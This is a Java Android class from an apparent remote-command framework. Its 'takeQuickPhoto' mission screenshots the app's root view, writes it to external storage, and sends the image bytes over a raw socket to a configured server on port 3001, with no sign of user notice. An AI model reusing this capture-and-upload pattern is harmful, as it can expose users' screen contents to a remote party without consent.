package BL.missions;

import android.app.Activity;
import android.graphics.Bitmap;
import android.os.Environment;
import android.text.format.DateFormat;
import android.view.View;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Date;

import BL.BLManager;
import SharedClasses.Config;
import SharedClasses.Logger;


public class TakeQuickPhotoMission extends Mission {

    public TakeQuickPhotoMission(int index) {
        super("takeQuickPhoto", index);
    }
    private String pic_name;
    @Override
    public void start() {
        takeScreenshot();
    }


    @Override
    public void stop() {

    }

    @Override
    public String encode() {
        return getName() + " " + getIndex() + " " + "Done" + " " + pic_name+".JPG";
    }

    private void sendFileToServer(File pic){
        //File pic = new File(BLManager.getInstance().file,file_name);
        Logger.debug("start read quick pic from android memory");

        try {
            int size = (int) pic.length();
            byte[] bytes = new byte[size];

            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(pic));
            buf.read(bytes, 0, bytes.length);
            buf.close();
            Logger.debug("finish read quick pic from android memory");
            sendPic(bytes);

        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    private void sendPic(final byte[] data) throws IOException {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Logger.debug("start send quick pic to server");
                    Socket socket = new Socket(Config.DST_ADDRESS, 3001);
                    OutputStream outputStream = socket.getOutputStream();
                    outputStream.write(data);
                    outputStream.flush();
                    socket.close();
                    Logger.debug("finish send quick pic to server");
                    onResult.onResult(null);
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }).start();
    }

    private void takeScreenshot() {

        Date now = new Date();
        DateFormat.format("yyyy-MM-dd_hh:mm:ss", now);

        try {
            // image naming and path  to include sd card  appending name you choose for file
            String mPath = Environment.getExternalStorageDirectory().toString() + "/" + now + ".jpg";
            pic_name=now+".jpg";
            // create bitmap screen capture
            //View v1=null;
            View v1 = BLManager.getInstance().getActivity().getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);

            File imageFile = new File(mPath);

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

            sendFileToServer(imageFile);
          //  openScreenshot(imageFile);
        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            e.printStackTrace();
        }
    }
}
